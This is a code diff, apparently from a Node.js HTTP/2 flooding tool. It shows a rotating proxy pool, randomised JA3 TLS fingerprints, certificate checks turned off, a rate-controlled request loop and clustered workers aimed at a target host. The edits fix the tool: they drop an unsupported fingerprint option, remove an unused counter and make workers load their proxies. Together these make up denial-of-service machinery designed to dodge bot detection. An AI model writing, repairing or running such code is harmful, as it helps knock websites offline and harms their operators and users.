@@ -128,7 +128,7 @@ function getLiveProxy() {
     return proxyPool[0] || null;
 }
 
-// JA3 generator
+// JA3 generator (but not used in tls options, kept for future)
 function randomJA3() {
     const sslVersions = ['771','772','773'];
     const ciphers = ['4865','4866','4867','49195','49196','49200','52393','52392','49171','49172','156','157','47','53'];
@@ -286,8 +286,8 @@ class H2Session {
                 rejectUnauthorized: false,
                 ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                 minVersion: 'TLSv1.3',
-                maxVersion: 'TLSv1.3',
-                fingerprint: currentJA3
+                maxVersion: 'TLSv1.3'
+                // fingerprint removed because Node.js tls.connect does not support it
             };
             const tlsConn = tls.connect(443, targetURL.hostname, tlsOpts);
             this.proxy.tls = tlsConn;
@@ -334,7 +334,6 @@ class H2Session {
     _sendLoop() {
         if (!this.active || !this.client) return;
         const delayMs = 1000 / this.rate;
-        let count = 0;
 
         const sendOne = () => {
             if (!this.active || this.client.destroyed) return;
@@ -357,7 +356,6 @@ class H2Session {
             });
             req.on('error', (e) => { if (CONFIG.debug) console.log('[REQ ERR]', e.message); req.close(); });
             req.end();
-            count++;
             setTimeout(sendOne, delayMs);
         };
         sendOne();
@@ -472,9 +470,8 @@ if (cluster.isMaster) {
     // ----------------------------------------------
     //  CLUSTER WORKER - FIXED
     // ----------------------------------------------
-    // Override CONFIG with the one from master
     CONFIG = JSON.parse(process.env.config);
-    loadProxies();  // <--- THIS WAS MISSING
+    loadProxies();  // THIS IS THE FIX
     console.log('[Worker] Started with', proxyPool.length, 'proxies');
 
     (async function worker() {
